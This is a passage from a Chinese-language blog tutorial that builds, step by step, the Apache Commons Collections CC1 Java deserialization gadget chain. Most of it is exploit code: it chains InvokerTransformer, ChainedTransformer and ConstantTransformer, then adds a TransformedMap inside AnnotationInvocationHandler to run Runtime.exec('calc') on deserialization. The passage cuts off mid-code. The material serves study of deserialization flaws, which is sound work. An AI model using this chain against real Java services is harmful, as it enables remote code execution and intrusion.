的源代码可知其没有继承 <code>Serializable</code> 也就是说是不能进行序列化的，但是 <code>Runtime.class</code> 即 <code>Class</code> 是可以序列化的。也就是说可以通过获取 <code>Runtime</code> 然后通过反射将其进行实例化</p><p>先写个简单地反射测试</p><ul><li>Exploit.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Method</span> getRuntime <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>getRuntime<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行截图</p><p><img src="/../../../../../pic/image-20230122012456396.png"></p><p>这是我们直接通过反射调用实现的命令执行，将其改造一下构造成通过 <code>InvokerTransformer</code> 进行反射</p><ul><li>Exploit.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 获取 getRuntime 方法</span>        <span class="token class-name">Method</span> getMethod <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 Runtime</span>        <span class="token class-name">Object</span> runtime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>getMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 执行 Runtime.exec</span>        <span class="token class-name">Object</span> exec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>runtime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重复编写代码显得有些冗余，这里可以使用 <code>ChainedTransformer</code> 对其进行简化</p><p><code>ChainedTransformer</code> 类下的 <code>transform</code> 方法递归调用了前一个方法的结果，作为后一个方法的参数。</p><p>简单编写一下代码</p><ul><li>Exploit.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        chainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/../../../../../pic/image-20230122013848871.png"></p><p>到此解决了 Runtime 序列化的问题</p><h3 id="4-2-setValue-传参"><a href="#4-2-setValue-传参" class="headerlink" title="4.2 setValue 传参"></a>4.2 setValue 传参</h3><p>根据审计源码可知固定的传参内容为一个 <code>AnnotationTypeMismatchExceptionProxy</code> 类，没法传入我们所需的 <code>Runtime.class</code> </p><p>因此需要引入第二个辅助类 <code>ConstantTransformer</code></p><ul><li>ConstantTransformer 关键代码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConstantTransformer</span> <span class="token keyword">implements</span> <span class="token class-name">Transformer</span><span class="token punctuation">,</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> iConstant<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Object</span> constantToReturn<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iConstant <span class="token operator">=</span> constantToReturn<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> iConstant<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可知执行 <code>transform</code> 时会直接将可控内容返回，可以在此处传入 <code>Runtime.class</code></p><ul><li>Exploit.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// Runtime.exec</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        chainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/../../../../../pic/image-20230122014652524.png"></p><h3 id="4-3-if-绕过"><a href="#4-3-if-绕过" class="headerlink" title="4.3 if 绕过"></a>4.3 if 绕过</h3><p><img src="/../../../../../pic/image-20230104000023.png"></p><p><code>memberValues</code> 与 <code>type</code> 都是通过构造方法传入，但是该构造方法未加修饰符即为使用 default，可以通过反射进行调用构造该类</p><p>根据调试信息编写 EXP</p><h3 id="4-4-完整-EXP"><a href="#4-4-完整-EXP" class="headerlink" title="4.4 完整 EXP"></a>4.4 完整 EXP</h3><ul><li>Exploit.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>ws<span class="token punctuation">.</span></span><span class="token class-name">Action</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token comment">// Runtime.exec</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 被修饰的 Map</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 填充内容绕过 if</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"fault"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 TransformedMap</span>        <span class="token class-name">Map</span> transformedMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取入口类</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取入口类默认构造方法</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> declaredConstructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过权限</span>        declaredConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化类</span>        <span class="token class-name">Object</span> object <span class="token operator">=</span> declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Action</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 序列化</span>        <span class="token class-name">Serialize</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 反序列化</span>        <span class="token class-name">Unserialize</span><span class="token punctuation">(</span><span class="token 